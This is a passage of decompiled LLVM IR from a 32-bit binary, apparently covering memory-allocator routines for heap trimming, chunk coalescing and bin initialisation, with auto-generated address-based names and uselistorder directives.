  store i32 %v1_804e83f, i32* %stack_var_-60, align 4
  %v3_804e85b = inttoptr i32 %v1_804e83f to i16*
  %v4_804e85b = call i32 @function_804d4b8(i16* %v3_804e85b, i32 %tmp8, i32 %v1_804e852)
  store i32 %v4_804e85b, i32* %eax.global-to-local, align 4
  store i32 %v1_804e83f, i32* %edx.global-to-local, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_804e865 = call i32 @function_804eac9(i32 %tmp8)
  br label %dec_label_pc_804e86a

dec_label_pc_804e86a:                             ; preds = %dec_label_pc_804e72c, %dec_label_pc_804e84d
  %storemerge = phi i32 [ %v1_804e865, %dec_label_pc_804e84d ], [ %v1_804e736, %dec_label_pc_804e72c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e877

dec_label_pc_804e86f:                             ; preds = %dec_label_pc_804e834, %dec_label_pc_804e690
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e877

dec_label_pc_804e873:                             ; preds = %dec_label_pc_804e82b, %dec_label_pc_804e795, %dec_label_pc_804e62f
  store i32 %tmp8, i32* @ebx, align 4
  br label %dec_label_pc_804e877

dec_label_pc_804e877:                             ; preds = %dec_label_pc_804e86f, %dec_label_pc_804e86a, %dec_label_pc_804e7de, %dec_label_pc_804e78d, %dec_label_pc_804e873
  store i32 %v2_804e59e, i32* @eax, align 4
  store i32 %v2_804e59e, i32* %stack_var_-60, align 4
  %v2_804e880 = call i32 @function_804f65e(i32 %v2_804e59e, i32 1)
  store i32 %v2_804e880, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e885

dec_label_pc_804e885:                             ; preds = %dec_label_pc_804e582, %dec_label_pc_804e56e, %dec_label_pc_804e877
  br label %dec_label_pc_804e888

dec_label_pc_804e888:                             ; preds = %dec_label_pc_804e5bc, %dec_label_pc_804e885
  %v0_804e88b = load i32, i32* @ebx, align 4
  store i32 %v0_804e88b, i32* %eax.global-to-local, align 4
  store i32 %v0_804e55f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804e88b

; uselistorder directives
  uselistorder i32 %v1_804e83f, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_804e816, { 1, 0 }
  uselistorder i32 %v2_804e80a, { 1, 0 }
  uselistorder i32 %v2_804e7f5, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804e7ec, { 1, 0 }
  uselistorder i32 %v7_804e7d1, { 1, 0, 2 }
  uselistorder i32 %v2_804e7c6, { 1, 0, 2 }
  uselistorder i32 %v1_804e7a6, { 2, 0, 1 }
  uselistorder i32 %v3_804e7a2, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804e761, { 1, 0 }
  uselistorder i32 %v1_804e6c7, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804e69b, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 %v2_804e63f, { 1, 0, 2 }
  uselistorder i32 %v3_804e652, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804e60f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_804e5f1, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_804e5e9, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 13, 4, 0, 1, 9, 10, 8, 7, 2, 5, 3, 6, 12, 11 }
  uselistorder i32 %v1_804e5de, { 1, 0 }
  uselistorder i32 %v1_804e5ce, { 1, 2, 0 }
  uselistorder i32 %v0_804e5b7, { 1, 0 }
  uselistorder i32 %v2_804e59e, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp8, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 5, 14, 15, 16, 17, 18 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 48, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 40, 41, 42, 0, 43, 44, 45, 46, 47 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804e888, { 1, 0 }
  uselistorder label %dec_label_pc_804e885, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e877, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e86a, { 1, 0 }
  uselistorder label %dec_label_pc_804e78d, { 1, 0 }
  uselistorder label %dec_label_pc_804e740, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e72c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e685, { 1, 0 }
  uselistorder label %dec_label_pc_804e5e5, { 1, 0 }
}

define i32 @function_804e894() local_unnamed_addr {
dec_label_pc_804e894:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_804e895 = load i32, i32* @edx, align 4
  store i32 %v0_804e895, i32* %ebp.global-to-local, align 4
  %v0_804e898 = load i32, i32* @esi, align 4
  %v1_804e89d = add i32 %v0_804e895, 860
  %v2_804e89d = inttoptr i32 %v1_804e89d to i32*
  %v3_804e89d = load i32, i32* %v2_804e89d, align 4
  store i32 %v3_804e89d, i32* @ecx, align 4
  %v1_804e8a3 = add i32 %v0_804e895, 44
  %v2_804e8a3 = inttoptr i32 %v1_804e8a3 to i32*
  %v3_804e8a3 = load i32, i32* %v2_804e8a3, align 4
  %v1_804e8a6 = add i32 %v3_804e8a3, 4
  %v2_804e8a6 = inttoptr i32 %v1_804e8a6 to i32*
  %v3_804e8a6 = load i32, i32* %v2_804e8a6, align 4
  %v1_804e8a9 = and i32 %v3_804e8a6, -4
  store i32 %v1_804e8a9, i32* @esi, align 4
  %v1_804e8ae = load i32, i32* @eax, align 4
  %v2_804e8ae = add i32 %v3_804e89d, -17
  %v2_804e8b0 = add i32 %v2_804e8ae, %v1_804e8a9
  %v3_804e8b0 = sub i32 %v2_804e8b0, %v1_804e8ae
  %div = udiv i32 %v3_804e8b0, %v3_804e89d
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_804e8b0, %v3_804e89d
  store i32 %tmp10, i32* @edx, align 4
  %v1_804e8b8 = add i32 %div, -1
  %v4_804e8bb = mul i32 %v1_804e8b8, %v3_804e89d
  store i32 %v4_804e8bb, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804e8bb, 1
  br i1 %tmp11, label %dec_label_pc_804e917, label %dec_label_pc_804e8c2

dec_label_pc_804e8c2:                             ; preds = %dec_label_pc_804e894
  %v1_804e8c7 = call i32 @function_804fdb8(i32 0)
  store i32 %v1_804e8c7, i32* %edi.global-to-local, align 4
  %v0_804e8d1 = load i32, i32* @esi, align 4
  store i32 %v0_804e8d1, i32* %eax.global-to-local, align 4
  %v1_804e8d3 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e8d3 = add i32 %v1_804e8d3, 44
  %v3_804e8d3 = inttoptr i32 %v2_804e8d3 to i32*
  %v4_804e8d3 = load i32, i32* %v3_804e8d3, align 4
  %v5_804e8d3 = add i32 %v4_804e8d3, %v0_804e8d1
  store i32 %v5_804e8d3, i32* %eax.global-to-local, align 4
  %v12_804e8d6 = icmp eq i32 %v1_804e8c7, %v5_804e8d3
  %v1_804e8d8 = icmp eq i1 %v12_804e8d6, false
  br i1 %v1_804e8d8, label %dec_label_pc_804e917, label %dec_label_pc_804e8da

dec_label_pc_804e8da:                             ; preds = %dec_label_pc_804e8c2
  %v1_804e8dd = sub i32 0, %v4_804e8bb
  store i32 %v1_804e8dd, i32* @ebx, align 4
  %v1_804e8e0 = call i32 @function_804fdb8(i32 %v1_804e8dd)
  store i32 %v1_804e8e0, i32* %eax.global-to-local, align 4
  %v1_804e8ec = call i32 @function_804fdb8(i32 0)
  store i32 %v1_804e8ec, i32* %eax.global-to-local, align 4
  %v10_804e8f4 = icmp eq i32 %v1_804e8ec, -1
  br i1 %v10_804e8f4, label %dec_label_pc_804e917, label %dec_label_pc_804e8f9

dec_label_pc_804e8f9:                             ; preds = %dec_label_pc_804e8da
  %v0_804e8f9 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e8fb = sub i32 %v0_804e8f9, %v1_804e8ec
  %v12_804e8fb = icmp eq i32 %v2_804e8fb, 0
  store i32 %v2_804e8fb, i32* @ecx, align 4
  br i1 %v12_804e8fb, label %dec_label_pc_804e917, label %dec_label_pc_804e8ff

dec_label_pc_804e8ff:                             ; preds = %dec_label_pc_804e8f9
  %v0_804e8ff = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e8ff = add i32 %v0_804e8ff, 44
  %v2_804e8ff = inttoptr i32 %v1_804e8ff to i32*
  %v3_804e8ff = load i32, i32* %v2_804e8ff, align 4
  store i32 %v3_804e8ff, i32* %eax.global-to-local, align 4
  %v0_804e902 = load i32, i32* @esi, align 4
  %v2_804e902 = sub i32 %v0_804e902, %v2_804e8fb
  store i32 %v2_804e902, i32* %esi.global-to-local, align 4
  %v1_804e904 = add i32 %v0_804e8ff, 872
  %v2_804e904 = inttoptr i32 %v1_804e904 to i32*
  %v3_804e904 = load i32, i32* %v2_804e904, align 4
  %v5_804e904 = sub i32 %v3_804e904, %v2_804e8fb
  store i32 %v5_804e904, i32* %v2_804e904, align 4
  %v0_804e90a = load i32, i32* %esi.global-to-local, align 4
  %v1_804e90a = or i32 %v0_804e90a, 1
  store i32 %v1_804e90a, i32* %esi.global-to-local, align 4
  %v1_804e90d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e90d = add i32 %v1_804e90d, 4
  %v3_804e90d = inttoptr i32 %v2_804e90d to i32*
  store i32 %v1_804e90a, i32* %v3_804e90d, align 4
  br label %dec_label_pc_804e919

dec_label_pc_804e917:                             ; preds = %dec_label_pc_804e8f9, %dec_label_pc_804e8da, %dec_label_pc_804e8c2, %dec_label_pc_804e894
  br label %dec_label_pc_804e919

dec_label_pc_804e919:                             ; preds = %dec_label_pc_804e8ff, %dec_label_pc_804e917
  %storemerge = phi i32 [ 1, %dec_label_pc_804e8ff ], [ 0, %dec_label_pc_804e917 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804e898, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804e8ec, { 1, 0, 2 }
  uselistorder i32 %v4_804e8bb, { 1, 2, 0 }
  uselistorder i32 %v3_804e89d, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_804e895, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_804fdb8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e919, { 1, 0 }
}

define i32 @function_804e921(i32* %arg1) local_unnamed_addr {
dec_label_pc_804e921:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_804e922 = load i32, i32* @edi, align 4
  %v0_804e923 = load i32, i32* @esi, align 4
  %v0_804e924 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_804e92c = load i32, i32* %arg1, align 4
  store i32 %v2_804e92c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804e933 = icmp eq i32 %v2_804e92c, 0
  br i1 %v1_804e933, label %dec_label_pc_804ea5c.preheader, label %dec_label_pc_804e93b

dec_label_pc_804ea5c.preheader:                   ; preds = %dec_label_pc_804e921
  %v3_804ea51 = add i32 %tmp11, 44
  br label %dec_label_pc_804ea4d

dec_label_pc_804e93b:                             ; preds = %dec_label_pc_804e921
  %v1_804e93f = and i32 %v2_804e92c, -3
  store i32 %v1_804e93f, i32* %arg1, align 4
  %v1_804e944 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_804e953 = add i32 %tmp11, 4
  store i32 %v1_804e953, i32* %eax.global-to-local, align 4
  %v2_804e95a = load i32, i32* %arg1, align 4
  %v2_804e960 = udiv i32 %v2_804e95a, 8
  %v2_804e963 = mul nuw i32 %v2_804e960, 4
  %v3_804e963 = add i32 %tmp11, -4
  %v4_804e963 = add i32 %v3_804e963, %v2_804e963
  store i32 %v4_804e963, i32* %eax.global-to-local, align 4
  %v2_804ea2a = add i32 %tmp11, 44
  %v3_804ea2a = inttoptr i32 %v2_804ea2a to i32*
  %v1_804e9fd = add i32 %tmp11, 60
  %v2_804e9fd = inttoptr i32 %v1_804e9fd to i32*
  br label %dec_label_pc_804e96b

dec_label_pc_804e96b:                             ; preds = %dec_label_pc_804ea43, %dec_label_pc_804e93b
  %v0_804e979 = phi i32 [ %v1_804e953, %dec_label_pc_804e93b ], [ %v4_804ea43, %dec_label_pc_804ea43 ]
  store i32 %v0_804e979, i32* %eax.global-to-local, align 4
  %v1_804e96f = inttoptr i32 %v0_804e979 to i32*
  %v2_804e96f = load i32, i32* %v1_804e96f, align 4
  store i32 %v2_804e96f, i32* @ecx, align 4
  %v1_804e971 = icmp eq i32 %v2_804e96f, 0
  br i1 %v1_804e971, label %dec_label_pc_804ea39, label %dec_label_pc_804e979

dec_label_pc_804e979:                             ; preds = %dec_label_pc_804e96b
  store i32 0, i32* %v1_804e96f, align 4
  %v0_804e97f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e97f

dec_label_pc_804e97f:                             ; preds = %dec_label_pc_804ea2d, %dec_label_pc_804e979
  %v0_804e99c = phi i32 [ %v3_804e97f, %dec_label_pc_804ea2d ], [ %v0_804e97f.pre, %dec_label_pc_804e979 ]
  %v1_804e97f = add i32 %v0_804e99c, 8
  %v2_804e97f = inttoptr i32 %v1_804e97f to i32*
  %v3_804e97f = load i32, i32* %v2_804e97f, align 4
  store i32 %v3_804e97f, i32* %edx.global-to-local, align 4
  %v1_804e986 = add i32 %v0_804e99c, 4
  %v2_804e986 = inttoptr i32 %v1_804e986 to i32*
  %v3_804e986 = load i32, i32* %v2_804e986, align 4
  store i32 %v3_804e986, i32* %eax.global-to-local, align 4
  %v1_804e98b = and i32 %v3_804e986, -2
  store i32 %v1_804e98b, i32* @edi, align 4
  %v2_804e98e = urem i32 %v3_804e986, 2
  %v3_804e98e = icmp eq i32 %v2_804e98e, 0
  %v2_804e990 = add i32 %v1_804e98b, %v0_804e99c
  store i32 %v2_804e990, i32* @ebx, align 4
  %v1_804e993 = add i32 %v2_804e990, 4
  %v2_804e993 = inttoptr i32 %v1_804e993 to i32*
  %v3_804e993 = load i32, i32* %v2_804e993, align 4
  store i32 %v3_804e993, i32* %edx.global-to-local, align 4
  %v1_804e99a = icmp eq i1 %v3_804e98e, false
  br i1 %v1_804e99a, label %dec_label_pc_804e9bc, label %dec_label_pc_804e99c

dec_label_pc_804e99c:                             ; preds = %dec_label_pc_804e97f
  %v1_804e99c = inttoptr i32 %v0_804e99c to i32*
  %v2_804e99c = load i32, i32* %v1_804e99c, align 4
  store i32 %v2_804e99c, i32* %ebp.global-to-local, align 4
  %v2_804e9a0 = sub i32 %v0_804e99c, %v2_804e99c
  store i32 %v2_804e9a0, i32* %eax.global-to-local, align 4
  %v1_804e9a2 = add i32 %v2_804e9a0, 8
  %v2_804e9a2 = inttoptr i32 %v1_804e9a2 to i32*
  %v3_804e9a2 = load i32, i32* %v2_804e9a2, align 4
  store i32 %v3_804e9a2, i32* @esi, align 4
  %v1_804e9a5 = add i32 %v2_804e9a0, 12
  %v2_804e9a5 = inttoptr i32 %v1_804e9a5 to i32*
  %v3_804e9a5 = load i32, i32* %v2_804e9a5, align 4
  store i32 %v3_804e9a5, i32* %edx.global-to-local, align 4
  %v1_804e9a8 = add i32 %v3_804e9a2, 12
  %v2_804e9a8 = inttoptr i32 %v1_804e9a8 to i32*
  %v3_804e9a8 = load i32, i32* %v2_804e9a8, align 4
  store i32 %v3_804e9a8, i32* @ecx, align 4
  %v12_804e9ab = icmp eq i32 %v3_804e9a8, %v2_804e9a0
  %v1_804e9ad = icmp eq i1 %v12_804e9ab, false
  br i1 %v1_804e9ad, label %dec_label_pc_804e9ec, label %dec_label_pc_804e9af

dec_label_pc_804e9af:                             ; preds = %dec_label_pc_804e99c
  %v1_804e9af = add i32 %v3_804e9a5, 8
  %v2_804e9af = inttoptr i32 %v1_804e9af to i32*
  %v3_804e9af = load i32, i32* %v2_804e9af, align 4
  %v15_804e9af = icmp eq i32 %v3_804e9af, %v3_804e9a8
  %v1_804e9b2 = icmp eq i1 %v15_804e9af, false
  br i1 %v1_804e9b2, label %dec_label_pc_804e9ec, label %dec_label_pc_804e9b4

dec_label_pc_804e9b4:                             ; preds = %dec_label_pc_804e9af
  %v2_804e9b4 = add i32 %v2_804e99c, %v1_804e98b
  store i32 %v2_804e9b4, i32* @edi, align 4
  store i32 %v3_804e9a5, i32* %v2_804e9a8, align 4
  %v0_804e9b9 = load i32, i32* @esi, align 4
  %v1_804e9b9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e9b9 = add i32 %v1_804e9b9, 8
  %v3_804e9b9 = inttoptr i32 %v2_804e9b9 to i32*
  store i32 %v0_804e9b9, i32* %v3_804e9b9, align 4
  %v0_804e9c7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e9bc

dec_label_pc_804e9bc:                             ; preds = %dec_label_pc_804e97f, %dec_label_pc_804e9b4
  %v1_804e9d0 = phi i32 [ %v2_804e990, %dec_label_pc_804e97f ], [ %v0_804e9c7.pre, %dec_label_pc_804e9b4 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804e9c4 = and i32 %v3_804e993, -4
  store i32 %v1_804e9c4, i32* %ebp.global-to-local, align 4
  %v4_804e9c7 = load i32, i32* %v3_804ea2a, align 4
  %v15_804e9c7 = icmp eq i32 %v1_804e9d0, %v4_804e9c7
  br i1 %v15_804e9c7, label %dec_label_pc_804ea1d, label %dec_label_pc_804e9cc

dec_label_pc_804e9cc:                             ; preds = %dec_label_pc_804e9bc
  %v2_804e9cc = add i32 %v1_804e9d0, 4
  %v3_804e9cc = add i32 %v2_804e9cc, %v1_804e9c4
  %v4_804e9cc = inttoptr i32 %v3_804e9cc to i32*
  %v5_804e9cc = load i32, i32* %v4_804e9cc, align 4
  store i32 %v5_804e9cc, i32* %eax.global-to-local, align 4
  %v3_804e9d0 = inttoptr i32 %v2_804e9cc to i32*
  store i32 %v1_804e9c4, i32* %v3_804e9d0, align 4
  %v0_804e9d3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e9d3 = urem i32 %v0_804e9d3, 2
  %v2_804e9d3 = icmp eq i32 %v1_804e9d3, 0
  store i32 %v1_804e9d3, i32* %eax.global-to-local, align 4
  %v1_804e9d8 = icmp eq i1 %v2_804e9d3, false
  br i1 %v1_804e9d8, label %dec_label_pc_804e9f9, label %dec_label_pc_804e9da

dec_label_pc_804e9da:                             ; preds = %dec_label_pc_804e9cc
  %v0_804e9da = load i32, i32* @ebx, align 4
  %v1_804e9da = add i32 %v0_804e9da, 8
  %v2_804e9da = inttoptr i32 %v1_804e9da to i32*
  %v3_804e9da = load i32, i32* %v2_804e9da, align 4
  store i32 %v3_804e9da, i32* @edx, align 4
  %v1_804e9dd = add i32 %v0_804e9da, 12
  %v2_804e9dd = inttoptr i32 %v1_804e9dd to i32*
  %v3_804e9dd = load i32, i32* %v2_804e9dd, align 4
  store i32 %v3_804e9dd, i32* %eax.global-to-local, align 4
  %v1_804e9e0 = add i32 %v3_804e9da, 12
  %v2_804e9e0 = inttoptr i32 %v1_804e9e0 to i32*
  %v3_804e9e0 = load i32, i32* %v2_804e9e0, align 4
  store i32 %v3_804e9e0, i32* @esi, align 4
  %v12_804e9e3 = icmp eq i32 %v3_804e9e0, %v0_804e9da
  %v1_804e9e5 = icmp eq i1 %v12_804e9e3, false
  br i1 %v1_804e9e5, label %dec_label_pc_804e9ec, label %dec_label_pc_804e9e7

dec_label_pc_804e9e7:                             ; preds = %dec_label_pc_804e9da
  %v1_804e9e7 = add i32 %v3_804e9dd, 8
  %v2_804e9e7 = inttoptr i32 %v1_804e9e7 to i32*
  %v3_804e9e7 = load i32, i32* %v2_804e9e7, align 4
  %v15_804e9e7 = icmp eq i32 %v3_804e9e7, %v3_804e9e0
  br i1 %v15_804e9e7, label %dec_label_pc_804e9f1, label %dec_label_pc_804e9ec

dec_label_pc_804e9ec:                             ; preds = %dec_label_pc_804e9e7, %dec_label_pc_804e9da, %dec_label_pc_804e9af, %dec_label_pc_804e99c
  %v0_804e9ec = call i32 @function_804ec88()
  store i32 %v0_804e9ec, i32* %eax.global-to-local, align 4
  %v1_804e9f3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e9f1

dec_label_pc_804e9f1:                             ; preds = %dec_label_pc_804e9e7, %dec_label_pc_804e9ec
  %v1_804e9f3 = phi i32 [ %v3_804e9da, %dec_label_pc_804e9e7 ], [ %v1_804e9f3.pre, %dec_label_pc_804e9ec ]
  %v0_804e9f3 = phi i32 [ %v3_804e9dd, %dec_label_pc_804e9e7 ], [ %v0_804e9ec, %dec_label_pc_804e9ec ]
  %v0_804e9f1 = load i32, i32* @edi, align 4
  %v1_804e9f1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e9f1 = add i32 %v1_804e9f1, %v0_804e9f1
  store i32 %v2_804e9f1, i32* @edi, align 4
  %v2_804e9f3 = add i32 %v1_804e9f3, 12
  %v3_804e9f3 = inttoptr i32 %v2_804e9f3 to i32*
  store i32 %v0_804e9f3, i32* %v3_804e9f3, align 4
  %v0_804e9f6 = load i32, i32* @edx, align 4
  %v1_804e9f6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e9f6 = add i32 %v1_804e9f6, 8
  %v3_804e9f6 = inttoptr i32 %v2_804e9f6 to i32*
  store i32 %v0_804e9f6, i32* %v3_804e9f6, align 4
  br label %dec_label_pc_804e9f9

dec_label_pc_804e9f9:                             ; preds = %dec_label_pc_804e9cc, %dec_label_pc_804e9f1
  store i32 %v1_804e944, i32* %eax.global-to-local, align 4
  %v3_804e9fd = load i32, i32* %v2_804e9fd, align 4
  store i32 %v3_804e9fd, i32* @edx, align 4
  %v0_804ea00 = load i32, i32* @ecx, align 4
  store i32 %v0_804ea00, i32* %v2_804e9fd, align 4
  %v0_804ea03 = load i32, i32* @edi, align 4
  %v1_804ea05 = or i32 %v0_804ea03, 1
  %v1_804ea08 = load i32, i32* @ecx, align 4
  %v2_804ea08 = add i32 %v1_804ea08, 4
  %v3_804ea08 = inttoptr i32 %v2_804ea08 to i32*
  store i32 %v1_804ea05, i32* %v3_804ea08, align 4
  %v0_804ea0b = load i32, i32* @ecx, align 4
  %v1_804ea0b = load i32, i32* @edx, align 4
  %v2_804ea0b = add i32 %v1_804ea0b, 12
  %v3_804ea0b = inttoptr i32 %v2_804ea0b to i32*
  store i32 %v0_804ea0b, i32* %v3_804ea0b, align 4
  store i32 %v1_804e944, i32* %eax.global-to-local, align 4
  %v0_804ea12 = load i32, i32* @edx, align 4
  %v1_804ea12 = load i32, i32* @ecx, align 4
  %v2_804ea12 = add i32 %v1_804ea12, 8
  %v3_804ea12 = inttoptr i32 %v2_804ea12 to i32*
  store i32 %v0_804ea12, i32* %v3_804ea12, align 4
  %v0_804ea15 = load i32, i32* @edi, align 4
  %v1_804ea15 = load i32, i32* @ecx, align 4
  %v3_804ea15 = add i32 %v1_804ea15, %v0_804ea15
  %v4_804ea15 = inttoptr i32 %v3_804ea15 to i32*
  store i32 %v0_804ea15, i32* %v4_804ea15, align 4
  %v0_804ea18 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea18 = load i32, i32* @ecx, align 4
  %v2_804ea18 = add i32 %v1_804ea18, 12
  %v3_804ea18 = inttoptr i32 %v2_804ea18 to i32*
  store i32 %v0_804ea18, i32* %v3_804ea18, align 4
  br label %dec_label_pc_804ea2d

dec_label_pc_804ea1d:                             ; preds = %dec_label_pc_804e9bc
  %v0_804ea1d = load i32, i32* @edi, align 4
  %v2_804ea1d = add i32 %v0_804ea1d, %v1_804e9c4
  %v1_804ea20 = or i32 %v2_804ea1d, 1
  store i32 %v1_804ea20, i32* %eax.global-to-local, align 4
  %v1_804ea23 = load i32, i32* @ecx, align 4
  %v2_804ea23 = add i32 %v1_804ea23, 4
  %v3_804ea23 = inttoptr i32 %v2_804ea23 to i32*
  store i32 %v1_804ea20, i32* %v3_804ea23, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_804ea2a = load i32, i32* @ecx, align 4
  store i32 %v0_804ea2a, i32* %v3_804ea2a, align 4
  br label %dec_label_pc_804ea2d

dec_label_pc_804ea2d:                             ; preds = %dec_label_pc_804e9f9, %dec_label_pc_804ea1d
  store i32 %v3_804e97f, i32* @ecx, align 4
  %v1_804ea31 = icmp eq i32 %v3_804e97f, 0
  %v1_804ea33 = icmp eq i1 %v1_804ea31, false
  br i1 %v1_804ea33, label %dec_label_pc_804e97f, label %dec_label_pc_804ea39

dec_label_pc_804ea39:                             ; preds = %dec_label_pc_804ea2d, %dec_label_pc_804e96b
  store i32 %v4_804e963, i32* @ecx, align 4
  %v15_804ea3d = icmp eq i32 %v0_804e979, %v4_804e963
  br i1 %v15_804ea3d, label %dec_label_pc_804eac1, label %dec_label_pc_804ea43

dec_label_pc_804ea43:                             ; preds = %dec_label_pc_804ea39
  %v4_804ea43 = add i32 %v0_804e979, 4
  br label %dec_label_pc_804e96b

dec_label_pc_804ea4d:                             ; preds = %dec_label_pc_804ea5c.preheader, %dec_label_pc_804ea4d
  %v1_804ea5120 = phi i32 [ 1, %dec_label_pc_804ea5c.preheader ], [ %v0_804ea5c.pre, %dec_label_pc_804ea4d ]
  %v2_804ea51 = mul i32 %v1_804ea5120, 8
  %v4_804ea51 = add i32 %v3_804ea51, %v2_804ea51
  store i32 %v4_804ea51, i32* %eax.global-to-local, align 4
  %v1_804ea55 = add i32 %v1_804ea5120, 1
  store i32 %v1_804ea55, i32* %edx.global-to-local, align 4
  %v2_804ea56 = add i32 %v4_804ea51, 12
  %v3_804ea56 = inttoptr i32 %v2_804ea56 to i32*
  store i32 %v4_804ea51, i32* %v3_804ea56, align 4
  %v0_804ea59 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ea59 = add i32 %v0_804ea59, 8
  %v3_804ea59 = inttoptr i32 %v2_804ea59 to i32*
  store i32 %v0_804ea59, i32* %v3_804ea59, align 4
  %v0_804ea5c.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_804ea5f = icmp sgt i32 %v0_804ea5c.pre, 95
  br i1 %v7_804ea5f, label %dec_label_pc_804ea61, label %dec_label_pc_804ea4d

dec_label_pc_804ea61:                             ; preds = %dec_label_pc_804ea4d
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804ea65 = add i32 %tmp11, 864
  %v2_804ea65 = inttoptr i32 %v1_804ea65 to i32*
  %v3_804ea65 = load i32, i32* %v2_804ea65, align 4
  %v4_804ea65 = or i32 %v3_804ea65, 1
  store i32 %v4_804ea65, i32* %v2_804ea65, align 4
  %v0_804ea6c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea6c = add i32 %v0_804ea6c, 840
  %v2_804ea6c = inttoptr i32 %v1_804ea6c to i32*
  store i32 0, i32* %v2_804ea6c, align 4
  %v0_804ea76 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea76 = add i32 %v0_804ea76, 852
  %v2_804ea76 = inttoptr i32 %v1_804ea76 to i32*
  store i32 65536, i32* %v2_804ea76, align 4
  %v0_804ea80 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea80 = add i32 %v0_804ea80, 844
  %v2_804ea80 = inttoptr i32 %v1_804ea80 to i32*
  store i32 262144, i32* %v2_804ea80, align 4
  %v0_804ea8a = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea8a = add i32 %v0_804ea8a, 836
  %v2_804ea8a = inttoptr i32 %v1_804ea8a to i32*
  store i32 262144, i32* %v2_804ea8a, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_804ea9b = load i32, i32* %arg1, align 4
  %v1_804ea9d = urem i32 %v2_804ea9b, 4
  %v1_804eaa0 = or i32 %v1_804ea9d, 72
  store i32 %v1_804eaa0, i32* %arg1, align 4
  %v0_804eaa5 = load i32, i32* @edx, align 4
  %v1_804eaa7 = add i32 %v0_804eaa5, 52
  store i32 %v1_804eaa7, i32* %eax.global-to-local, align 4
  %v2_804eaaa = add i32 %v0_804eaa5, 44
  %v3_804eaaa = inttoptr i32 %v2_804eaaa to i32*
  store i32 %v1_804eaa7, i32* %v3_804eaaa, align 4
  %v1_804eaaf = call i32 @function_804f4d4(i32 30)
  store i32 %v1_804eaaf, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_804eabb = add i32 %tmp11, 860
  %v3_804eabb = inttoptr i32 %v2_804eabb to i32*
  store i32 %v1_804eaaf, i32* %v3_804eabb, align 4
  br label %dec_label_pc_804eac1

dec_label_pc_804eac1:                             ; preds = %dec_label_pc_804ea39, %dec_label_pc_804ea61
  store i32 %v0_804e924, i32* @ebx, align 4
  store i32 %v0_804e923, i32* @esi, align 4
  store i32 %v0_804e922, i32* @edi, align 4
  %v0_804eac8 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804eac8

